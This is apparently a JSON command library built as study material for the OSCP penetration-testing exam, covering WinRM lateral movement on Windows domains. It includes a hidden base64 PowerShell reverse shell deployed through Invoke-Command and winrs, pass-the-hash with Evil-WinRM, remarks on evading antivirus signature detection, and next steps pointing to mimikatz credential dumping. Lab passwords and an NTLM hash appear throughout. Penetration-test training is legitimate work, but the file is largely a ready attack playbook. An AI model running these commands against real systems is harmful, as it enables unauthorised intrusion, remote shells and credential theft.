{
  "commands": [
    {
      "id": "winrm-enter-pssession",
      "name": "WinRM - Enter-PSSession Interactive",
      "description": "Establish interactive PowerShell remoting session using Enter-PSSession (native Windows PowerShell)",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Enter-PSSession -ComputerName <TARGET> -Credential $credential",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username with Remote Management Users or Administrators group membership",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "interactive",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-new-pssession",
        "winrm-invoke-command",
        "evil-winrm-creds"
      ],
      "next_steps": [],
      "flag_explanations": {
        "ConvertTo-SecureString": "Converts plain text password to encrypted SecureString object",
        "-AsPlainText": "Accepts plain text password input",
        "-Force": "Suppresses confirmation prompts",
        "New-Object PSCredential": "Creates credential object for authentication",
        "Enter-PSSession": "Establishes interactive remote PowerShell session",
        "-ComputerName": "Target system hostname or IP address",
        "-Credential": "PSCredential object containing username and password"
      },
      "success_indicators": [
        "[<TARGET>]: PS C:\\Users\\",
        "Prompt shows remote computer name in brackets",
        "Commands execute on remote system"
      ],
      "failure_indicators": [
        "WinRM cannot complete the operation",
        "Access is denied",
        "The user name or password is incorrect",
        "The WinRM client cannot process the request"
      ],
      "troubleshooting": {
        "Access is denied": "User must be in Remote Management Users or Administrators group. Verify: net user <USER> /domain",
        "WinRM cannot complete": "Check WinRM enabled: Test-WSMan -ComputerName <TARGET>",
        "Connection timeout": "Firewall blocking port 5985/5986: Test-NetConnection <TARGET> -Port 5985",
        "SSL certificate error": "Use -UseSSL flag for port 5986 or -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)"
      },
      "notes": "OSCP TRAINING MATERIAL - POWERSHELL REMOTING (ENTER-PSSESSION):\nTRAINING WORKFLOW:\nFrom OSCP module, PowerShell remoting demonstrated with session creation:\n1.\n\nCreate PSCredential object (ConvertTo-SecureString + New-Object PSCredential)\n\n2.\n\nNew-PSSession -ComputerName 192.168.50.73 -Credential $credential (creates session)\n\n3.\n\nEnter-PSSession 1 (connects to session ID 1 interactively)\n\n4.\n\nCommands execute remotely, verified with whoami/hostname showing FILES04\n\nWHAT IS POWERSHELL REMOTING:\nMicrosoft's official remote administration protocol called \"PowerShell remoting\" - built-in WinRM capability accessed through PowerShell cmdlets.\n\nInvoked via Enter-PSSession for interactive access.\n\nPROTOCOL:\nWinRM over WS-Management:\n- Port 5985:\nHTTP (plain HTTP traffic)\n- Port 5986:\nHTTPS (encrypted SSL/TLS traffic)\n- Based on WS-Management open standard\n\nGROUP MEMBERSHIP REQUIREMENT (CRITICAL):\nUser must be member of:\n- Administrators group (default), OR\n- Remote Management Users group\n\non the target machine.\n\nPSCREDENTIAL OBJECT CREATION (REQUIRED):\nTraining shows three-step process:\n  $username = 'jen'\n  $password = 'Nexus123!'\n  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\nThis pattern is reusable across WMI, WinRM, and other PowerShell remote operations.\n\nINTERACTIVE SESSION BEHAVIOR:\n- Prompt changes to [TARGET]:\nPS C:\\Users\\username>\n- All commands execute in remote PowerShell context\n- Current directory, environment variables are REMOTE system's\n- Exit-PSSession returns to local prompt\n- Session persists after disconnection (can reconnect with Enter-PSSession)\n\nCOMPARISON - ENTER-PSSESSION VS NEW-PSSESSION:\n- Enter-PSSession:\n  Interactive (like SSH), single target, manual command entry\n\n- New-PSSession:\n  Creates session object for programmatic use with Invoke-Command\n\n- Both use WinRM, same port requirements, same authentication\n\nLOGGING & DETECTION:\n- Event ID 4624:\nLogon event (Type 3:\nNetwork logon)\n- Event ID 4688:\nProcess creation (PowerShell.exe)\n- WinRM event logs:\nMicrosoft-Windows-WinRM/Operational\n- PowerShell script block logging (if enabled)\n- MORE VISIBLE than WMI/DCOM - creates legitimate admin session logs\n\nWHOAMI BEHAVIOR:\nTraining notes whoami shows remote user identity correctly (corp\\jen on FILES04), confirming remote execution context.\n\nTime:\n2-3 minutes (PSCredential creation + session establishment + verification)\n\nEXAM STRATEGY:\nMost stable and feature-rich Windows\u2192Windows lateral movement.\n\nUse when you control Windows attack box and want interactive access.\n\nFor automation, use Invoke-Command or New-PSSession.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump cached credentials from interactive session ad-user-enumeration  # Enumerate domain accounts and groups"
      },
      "filled_example": "$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); Enter-PSSession -ComputerName 192.168.50.73 -Credential $credential"
    },
    {
      "id": "winrm-new-pssession",
      "name": "WinRM - New-PSSession Reusable Session",
      "description": "Create persistent reusable PowerShell remoting session with New-PSSession for multiple command execution",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $session = New-PSSession -ComputerName <TARGET> -Credential $credential; Invoke-Command -Session $session -ScriptBlock {<COMMAND>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "PowerShell command to execute in session",
          "example": "whoami; hostname",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "session-management",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-enter-pssession",
        "winrm-invoke-command"
      ],
      "next_steps": [],
      "flag_explanations": {
        "New-PSSession": "Creates persistent PowerShell session object (reusable)",
        "-Session": "References existing session object for command execution",
        "-ScriptBlock": "PowerShell code block to execute remotely",
        "Invoke-Command": "Executes commands in remote session",
        "$session": "Variable storing session object for reuse"
      },
      "success_indicators": [
        "Session object created",
        "$session variable contains PSSession",
        "Get-PSSession shows active session",
        "Commands execute successfully"
      ],
      "failure_indicators": [
        "New-PSSession : Access is denied",
        "The WinRM client cannot process the request",
        "Cannot validate argument on parameter 'Session'"
      ],
      "troubleshooting": {
        "Access denied": "Verify credentials: Test-WSMan -ComputerName <TARGET> -Credential $credential",
        "Session creation fails": "Check WinRM service: Get-Service WinRM -ComputerName <TARGET>",
        "Session disconnected": "Network interruption. Reconnect: Connect-PSSession -Session $session",
        "Session not found": "Session may have timed out (default 4 hours). Create new session"
      },
      "notes": "EDUCATIONAL CONTEXT:\nNew-PSSession creates persistent session object for efficient multi-command execution.\n\nWHY PERSISTENT:\nAvoids re-authentication overhead for each command - session remains open until explicitly removed.\n\nADVANTAGES OVER ENTER-PSSESSION:\n- Non-blocking (can run commands in background)\n- Supports parallel execution on multiple targets\n- Better for automation\n\nUSE CASE:\nBatch automation - execute multiple scripts without reconnecting.\n\nPERFORMANCE:\n- First command slower (session creation)\n- Subsequent commands faster (reuse)\n\nSESSION MANAGEMENT:\n- View sessions:\nGet-PSSession\n- Remove session:\nRemove-PSSession $session\n- Timeout:\nDefault idle timeout 4 hours (configurable with -SessionOption)\n\nPARALLEL EXECUTION:\nCreate array of sessions, use Invoke-Command -Session $sessions -Parallel.\n\nTime:\n2-3 minutes for setup, <1 minute per subsequent command\n\nEXAM TIP:\nUse for scripted enumeration across multiple targets.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "winrm-invoke-command  # Execute commands using session: Invoke-Command -Session $session -ScriptBlock {command}"
      },
      "filled_example": "$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); $session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential; Invoke-Command -Session $session -ScriptBlock {whoami; hostname}"
    },
    {
      "id": "winrm-invoke-command",
      "name": "WinRM - Invoke-Command One-Shot Execution",
      "description": "Execute single PowerShell command remotely without persistent session using Invoke-Command",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "PowerShell command or script block to execute",
          "example": "Get-Process",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "one-shot",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-new-pssession",
        "evil-winrm-creds",
        "wmi-invoke-method"
      ],
      "next_steps": [],
      "flag_explanations": {
        "Invoke-Command": "Executes commands on remote computers",
        "-ComputerName": "Target system (can be array for multiple targets)",
        "-ScriptBlock": "PowerShell code to execute remotely",
        "-FilePath": "Alternative to -ScriptBlock - execute local script remotely",
        "-ArgumentList": "Pass parameters to script block"
      },
      "success_indicators": [
        "Command output returned to local console",
        "PSComputerName property shows remote hostname",
        "No error messages"
      ],
      "failure_indicators": [
        "Invoke-Command : Access is denied",
        "The WinRM client cannot process the request",
        "The user name or password is incorrect"
      ],
      "troubleshooting": {
        "Access denied": "User not in Remote Management Users group. Verify: net localgroup 'Remote Management Users' /domain",
        "WinRM client error": "Enable WinRM on target: Enable-PSRemoting -Force",
        "Script block too long": "Use -FilePath instead: Invoke-Command -FilePath .\\script.ps1 -ComputerName <TARGET>",
        "No output returned": "Command may still execute - verify on target system"
      },
      "notes": "EDUCATIONAL CONTEXT:\nInvoke-Command is PowerShell's most versatile remote execution method - supports one-shot and persistent sessions.\n\nWHY ONE-SHOT:\nQuick command execution without session management overhead.\n\nWHEN TO USE:\n- Single command\n- Quick enumeration\n- Testing connectivity\n\nCOMPARISON:\n- Faster for single command than Enter-PSSession (no interactive overhead)\n- Slower for multiple commands than New-PSSession (no session reuse)\n\nMULTIPLE TARGETS:\nSupports parallel execution:\n  Invoke-Command -ComputerName @('target1','target2','target3') -ScriptBlock {whoami}\n\nSCRIPT EXECUTION:\nUse -FilePath to execute local script on remote system:\n  Invoke-Command -FilePath .\\script.ps1 -ComputerName <TARGET> -Credential $credential\n\nOUTPUT HANDLING:\nResults include PSComputerName property for multi-target tracking.\n\nALTERNATIVE SYNTAX:\nShorter form:\n  Invoke-Command -ComputerName <TARGET> {<COMMAND>} -Credential $credential\n\nTime:\n1-2 minutes per command\n\nEXAM TIP:\nBest for quick enumeration, use New-PSSession for sustained access.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "winrm-new-pssession  # Upgrade to persistent session for multiple commands"
      },
      "filled_example": "$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {Get-Process}"
    },
    {
      "id": "winrm-winrs",
      "name": "WinRM - Legacy winrs.exe Command",
      "description": "Execute commands remotely using legacy winrs.exe utility (Windows Remote Shell)",
      "command": "winrs -r:<TARGET> -u:<USER> -p:<PASS> <COMMAND>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "cmd.exe command to execute (not PowerShell)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "winrs",
        "lateral-movement",
        "active-directory",
        "windows",
        "legacy",
        "oscp:medium"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-invoke-command",
        "evil-winrm-creds"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-r:<TARGET>": "Remote computer name or IP",
        "-u:<USER>": "Username in DOMAIN\\user format",
        "-p:<PASS>": "Password for authentication",
        "-noprofile": "Don't load user profile (faster)",
        "-environment": "Set environment variables"
      },
      "success_indicators": [
        "Command output displayed",
        "No error messages",
        "Exit code 0"
      ],
      "failure_indicators": [
        "Winrs error: Access is denied",
        "WinRM service is not available",
        "The specified credentials were rejected by the server"
      ],
      "troubleshooting": {
        "Access denied": "User needs Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add",
        "WinRM not available": "Enable on target: winrm quickconfig -q",
        "Credentials rejected": "Verify password: crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        "Command not found": "winrs executes cmd.exe commands only, not PowerShell"
      },
      "notes": "OSCP TRAINING MATERIAL - WINRS (WINDOWS REMOTE SHELL):\nTRAINING EXAMPLE:\nFrom OSCP module, jen's credentials used to execute commands remotely on FILES04:\n  winrs -r:files04 -u:jen -p:Nexus123! \"cmd /c hostname & whoami\"\n\nEXPECTED OUTPUT:\n  FILES04\n  corp\\jen\n\nWHAT IS WINRS:\nWindows Remote Shell - command-line WinRM client pre-dating PowerShell remoting.\n\nBuilt into all modern Windows systems.\n\nAlternative to PsExec/WMI when PowerShell unavailable.\n\nPROTOCOL:\nWinRM over WS-Management:\n- Port 5986:\nEncrypted HTTPS traffic\n- Port 5985:\nPlain HTTP\n- Microsoft's implementation of WS-Management protocol\n\nGROUP MEMBERSHIP REQUIREMENT (CRITICAL):\nFor winRS to work, domain user must be part of:\n- Administrators group (local admin rights), OR\n- Remote Management Users group on target host\n\nThis is explicitly stated in training:\n\"For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.\"\n\nREVERSE SHELL DEPLOYMENT:\nTraining shows replacing commands with base64-encoded PowerShell reverse shell:\n  winrs -r:files04 -u:jen -p:Nexus123! \"powershell -nop -w hidden -e JABjAGwAaQBlAG4A...\"\n\nThis spawned reverse shell to Netcat listener on Kali (port 443), achieving lateral movement.\n\nLIMITATIONS VS POWERSHELL REMOTING:\n- cmd.exe commands only (unless invoking powershell.exe)\n- No interactive persistent session\n- No tab completion or command history\n- Less sophisticated than Enter-PSSession\n\nCOMMAND EXECUTION SYNTAX:\n- Use \"cmd /c\" prefix for multiple commands:\n  winrs -r:files04 \"cmd /c hostname & whoami\"\n\n- Quote entire command string\n- Commands execute in cmd.exe context, NOT PowerShell\n\nWHEN TO USE IN OSCP:\n- PowerShell remoting blocked/restricted\n- Quick one-off command execution\n- Older Windows systems (pre-PowerShell 2.0)\n- Compatibility with cmd.exe-based tools\n\nTime:\n<1 minute per command execution\n\nEXAM STRATEGY:\nPrefer PowerShell remoting (Enter-PSSession/Invoke-Command) for better functionality.\n\nUse winrs as fallback when PowerShell restricted.",
      "oscp_relevance": "medium",
      "methodology_guidance": {
        "after_success": "winrm-invoke-command  # Upgrade to PowerShell remoting for better functionality"
      },
      "filled_example": "winrs -r:192.168.50.73 -u:corp\\jen -p:Nexus123! whoami"
    },
    {
      "id": "evil-winrm-creds",
      "name": "Evil-WinRM - Password Authentication",
      "description": "Establish interactive PowerShell remoting from Kali using Evil-WinRM with password authentication",
      "command": "evil-winrm -i <TARGET> -u <USER> -p '<PASS>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username (with or without domain)",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "evil-winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "interactive",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "evil-winrm-hash",
        "winrm-enter-pssession",
        "psexec-impacket-shell"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-i": "Target IP address",
        "-u": "Username for authentication",
        "-p": "Password (use single quotes to escape special characters)",
        "-H": "Use NTLM hash instead of password (see evil-winrm-hash)",
        "-S": "Use SSL (HTTPS on port 5986)",
        "-P": "Specify custom port (default 5985 HTTP, 5986 HTTPS)",
        "-s": "Path to PowerShell scripts directory (auto-loaded)",
        "-e": "Path to executables directory (auto-loaded)"
      },
      "success_indicators": [
        "Evil-WinRM shell v3",
        "*Evil-WinRM* PS C:\\Users\\",
        "Interactive PowerShell prompt obtained"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError",
        "Error: An error of type Errno::ETIMEDOUT",
        "Error: SSL certificate verify failed"
      ],
      "troubleshooting": {
        "Authorization error": "User not in Remote Management Users group. Verify with: crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        "Connection timeout": "Port 5985/5986 blocked. Check: sudo nmap -p 5985,5986 -Pn -v <TARGET>",
        "SSL certificate failed": "Use -S flag for HTTPS with self-signed cert, or omit -S for HTTP",
        "Password with special chars": "Wrap password in single quotes: -p 'Pass@123!'",
        "Domain authentication": "Specify domain: -u 'DOMAIN\\user' or -u user@domain.com"
      },
      "notes": "EDUCATIONAL CONTEXT:\nEvil-WinRM is Ruby-based WinRM client for Kali - preferred tool for Windows lateral movement from Linux.\n\nWHY EVIL-WINRM:\n- Built-in file upload/download\n- PowerShell script loading\n- Executable management\n- Tab completion\n- Command history\n\nADVANTAGES:\n- Native feel (PowerShell prompt)\n- Upload/download commands\n- Menu system (help menu)\n\nFILE OPERATIONS:\n  upload /kali/path C:\\Windows\\Temp\\file.exe\n  download C:\\Users\\user\\file.txt /kali/path\n\nSCRIPT LOADING:\nUse -s /path/to/scripts to auto-load PowerShell scripts:\n  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -s /opt/powershell\n\nScripts accessible with script_name (no .ps1 extension).\n\nEXECUTABLE MENU:\nUse -e /path/to/exes for pre-loaded binaries:\n  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -e /opt/binaries\n\nRun with Invoke-Binary.\n\nSTEALTH:\nCreates standard WinRM logs (Event ID 4624, 4688) - same as legitimate admin access.\n\nCOMPARISON:\nMore features than Invoke-Command, easier than PSExec from Kali.\n\nTime:\n1-2 minutes for connection\n\nEXAM TIP:\nFirst choice for Kali \u2192 Windows lateral movement, most stable and feature-rich.\n\nCOMMON LOCATIONS:\nDefault Kali install, or:\n  gem install evil-winrm",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS ad-user-enumeration  # Enumerate domain users and groups"
      },
      "filled_example": "evil-winrm -i 192.168.50.73 -u jen -p 'Nexus123!'"
    },
    {
      "id": "evil-winrm-hash",
      "name": "Evil-WinRM - Pass-the-Hash",
      "description": "Authenticate to WinRM using NTLM hash instead of password (pass-the-hash attack)",
      "command": "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username (without password)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32-character hex string)",
          "example": "64f12cddaa88057e06a81b54e73b949b",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "evil-winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "pass-the-hash",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "evil-winrm-creds",
        "psexec-impacket-shell"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-H": "NTLM hash for pass-the-hash authentication",
        "-i": "Target IP address",
        "-u": "Username (hash used instead of password)",
        "Full hash format": "LM:NTLM (use :NTLM_HASH if no LM hash available)"
      },
      "success_indicators": [
        "Evil-WinRM shell v3",
        "*Evil-WinRM* PS C:\\Users\\",
        "Authentication successful without password"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError",
        "Error: Invalid hash format",
        "Error: An error of type Errno::ECONNREFUSED"
      ],
      "troubleshooting": {
        "Invalid hash format": "Use 32-character hex NTLM hash only (no LM hash needed)",
        "Authorization error": "Hash may be invalid or user lacks WinRM access. Verify hash with: crackmapexec smb <TARGET> -u <USER> -H <HASH>",
        "Connection refused": "Port 5985 closed. Check: sudo nmap -p 5985 -Pn -v <TARGET>",
        "Hash accepted but access denied": "User account may be disabled or WinRM restricted"
      },
      "notes": "EDUCATIONAL CONTEXT:\nPass-the-hash allows authentication with NTLM hash without knowing plaintext password - critical for lateral movement.\n\nWHY THIS WORKS:\nWindows NTLM authentication accepts hash directly - password never needed if you have hash.\n\nHASH EXTRACTION:\nObtain hashes with:\n- secretsdump.py (Impacket)\n- mimikatz (lsadump::sam)\n- crackmapexec --sam\n\nHASH FORMAT:\nOnly need NTLM portion (32 hex chars), LM hash optional:\n- If both available:\n  -H LM:NTLM\n\n- If NTLM only:\n  -H :NTLM_HASH\n  OR\n  -H NTLM_HASH\n\nSTEALTH:\nCreates same logs as password authentication - hash usage not visible in logs.\n\nPERSISTENCE:\nHash remains valid until password changed - can reuse for multiple sessions.\n\nLATERAL MOVEMENT:\nSame hash works across all machines where account is local admin (local accounts) or domain member (domain accounts).\n\nTime:\n1-2 minutes (same as password auth)\n\nEXAM TIP:\nCritical technique after dumping SAM/NTDS - enables lateral movement without password cracking.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS ad-user-enumeration  # Enumerate domain users and groups evil-winrm-hash  # Reuse hash for lateral movement to other targets"
      },
      "filled_example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b"
    },
    {
      "id": "test-wsman",
      "name": "WinRM - Test-WSMan Verification",
      "description": "Verify WinRM service is accessible and responding on target before attempting authentication",
      "command": "Test-WSMan -ComputerName <TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "verification",
        "enumeration",
        "active-directory",
        "windows",
        "oscp:medium"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "Test-WSMan": "Tests WinRM connectivity and returns service info",
        "-ComputerName": "Target system to test",
        "-Credential": "Optional - test with specific credentials",
        "-UseSSL": "Test HTTPS (port 5986) instead of HTTP (port 5985)",
        "-Port": "Specify non-standard port (default 5985)"
      },
      "success_indicators": [
        "wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd",
        "ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd",
        "ProductVendor : Microsoft Corporation",
        "ProductVersion : OS:"
      ],
      "failure_indicators": [
        "Test-WSMan : The WinRM client cannot complete the operation",
        "The client cannot connect to the destination specified in the request",
        "WinRM cannot process the request"
      ],
      "troubleshooting": {
        "Cannot connect": "Port 5985 blocked by firewall: sudo nmap -p 5985,5986 -Pn -v <TARGET>",
        "Request timeout": "Target unreachable or WinRM disabled: Test-NetConnection <TARGET> -Port 5985",
        "SSL/TLS error": "Use -UseSSL for HTTPS (port 5986) or omit for HTTP (port 5985)",
        "Access denied": "This test doesn't require credentials - if denied, WinRM may be restricted to specific IPs"
      },
      "notes": "EDUCATIONAL CONTEXT:\nTest-WSMan performs unauthenticated connectivity test to WinRM service - quick way to verify WinRM availability before attempting authentication.\n\nWHY TEST FIRST:\nAvoids failed authentication attempts, validates port accessibility, identifies protocol version.\n\nWHAT IT CHECKS:\nWinRM service responding, protocol version supported, product version (Windows OS).\n\nNO CREDENTIALS:\nBasic test requires no authentication - checks if service is listening.\n\nPORTS:\nDefault HTTP on 5985, HTTPS on 5986 (use -UseSSL).\n\nVERBOSE OUTPUT:\nReturns XML identifying service details (wsmid, ProtocolVersion, ProductVendor).\n\nALTERNATIVE TEST:\nFrom Kali use nmap -p 5985,5986 or crackmapexec winrm <TARGET> (shows WINRM in banner).\n\nTIME ESTIMATE:\n<30 seconds.\n\nEXAM TIP:\nQuick check before attempting lateral movement - confirms WinRM available.",
      "oscp_relevance": "medium",
      "methodology_guidance": {
        "after_success": "evil-winrm-creds  # If successful, proceed with authentication winrm-enter-pssession  # Alternative PowerShell remoting method"
      },
      "filled_example": "Test-WSMan -ComputerName 192.168.50.73"
    },
    {
      "id": "winrm-revshell-invoke",
      "name": "WinRM - PowerShell Reverse Shell via Invoke-Command",
      "description": "Deploy base64-encoded PowerShell reverse shell through WinRM for callback to attacker",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {powershell -nop -w hidden -e <BASE64_PAYLOAD>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell (use base64-encode-powershell)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "reverse-shell",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-powershell-revshell"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-nop": "No profile - don't load PowerShell profiles (faster execution, stealthy)",
        "-w hidden": "Hidden window - no visible PowerShell window spawned",
        "-e <BASE64>": "Encoded command - executes base64-encoded payload",
        "-ScriptBlock": "PowerShell code block executed remotely via WinRM"
      },
      "success_indicators": [
        "Netcat listener receives connection",
        "PowerShell prompt from target",
        "whoami shows target user context"
      ],
      "failure_indicators": [
        "Invoke-Command : Access is denied",
        "No connection received on listener",
        "The term 'powershell' is not recognized",
        "Base64 decoding error"
      ],
      "troubleshooting": {
        "No connection received": "Verify LHOST/LPORT in encoded payload match listener: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Access denied": "User lacks Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add",
        "Payload execution error": "Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Firewall blocking callback": "Test outbound connectivity first: Test-NetConnection <LHOST> -Port <LPORT>",
        "PowerShell not found": "Use full path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      },
      "notes": "EDUCATIONAL CONTEXT:\nCombines WinRM lateral movement with PowerShell reverse shell for full interactive callback.\n\nWHY BASE64:\nAvoids escaping issues with special characters in PowerShell one-liner, bypasses some basic AV signature detection.\n\nHOW TO GENERATE PAYLOAD:\nUse base64-encode-powershell command or:\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $encoded = [Convert]::ToBase64String($bytes).\n\nWHAT HAPPENS:\nInvoke-Command executes 'powershell -e' on target \u2192 target decodes base64 \u2192 executes reverse shell \u2192 connects back to LHOST:LPORT.\n\nSTEALTH CONSIDERATIONS:\n-w hidden prevents visible window, -nop avoids profile scripts, base64 bypasses simple string detection.\n\nLOGGING:\nCreates WinRM event logs (Event ID 4624, 4688) and PowerShell script block logging if enabled.\n\nMANUAL DECODE TEST:\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')) to verify payload.\n\nALTERNATIVES:\nUse Evil-WinRM to upload nc.exe or other reverse shell binary.\n\nTIME ESTIMATE:\n3-5 minutes including payload generation and listener setup.\n\nEXAM TIP:\nPre-generate base64 payloads before exam for common LHOST/LPORT combinations.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials after shell established ad-user-enumeration  # Enumerate domain accounts"
      },
      "filled_example": "$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\\jen', $password); Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...}"
    }
  ]
}